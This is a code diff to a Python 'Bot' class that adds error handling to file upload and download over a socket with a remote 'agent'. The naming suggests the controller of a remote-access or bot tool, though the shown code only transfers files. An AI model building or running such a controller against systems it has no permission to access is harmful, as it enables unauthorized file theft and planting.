@@ -107,20 +107,23 @@ class Bot:
             self.reliable_send({
                 'command': 'upload',
                 'filename': filename,
-                'size': len(file_data)
+                'size': str(len(file_data))  # Convert size to string
             })
             
             # Wait for ready confirmation
             response = self.reliable_recv()
-            if not response.get('ready'):
+            if not response or not response.get('ready'):
                 return False, "Agent not ready to receive file"
             
             # Send file data
-            self.target.sendall(file_data)
+            try:
+                self.target.sendall(file_data)
+            except Exception as e:
+                return False, f"Error sending file data: {str(e)}"
             
             # Get upload confirmation
             response = self.reliable_recv()
-            if response.get('success'):
+            if response and response.get('success'):
                 return True, f"File {filename} uploaded successfully"
             else:
                 return False, response.get('error', 'Upload failed')
@@ -139,23 +142,33 @@ class Bot:
             
             # Get initial response with file size or error
             response = self.reliable_recv()
+            if not response:
+                return False, "No response from agent", None
+            
             if response.get('error'):
                 return False, response['error'], None
             
-            file_size = response.get('size')
-            if not file_size:
-                return False, "No file size received", None
+            try:
+                file_size = int(response.get('size', 0))
+            except (ValueError, TypeError):
+                return False, "Invalid file size received", None
+            
+            if file_size == 0:
+                return False, "Empty file size received", None
             
             # Receive file data
             received_data = b''
             remaining = file_size
             
-            while remaining > 0:
-                chunk = self.target.recv(min(4096, remaining))
-                if not chunk:
-                    break
-                received_data += chunk
-                remaining -= len(chunk)
+            try:
+                while remaining > 0:
+                    chunk = self.target.recv(min(4096, remaining))
+                    if not chunk:
+                        break
+                    received_data += chunk
+                    remaining -= len(chunk)
+            except Exception as e:
+                return False, f"Error receiving file data: {str(e)}", None
             
             if len(received_data) == file_size:
                 return True, f"File {filename} downloaded successfully", received_data
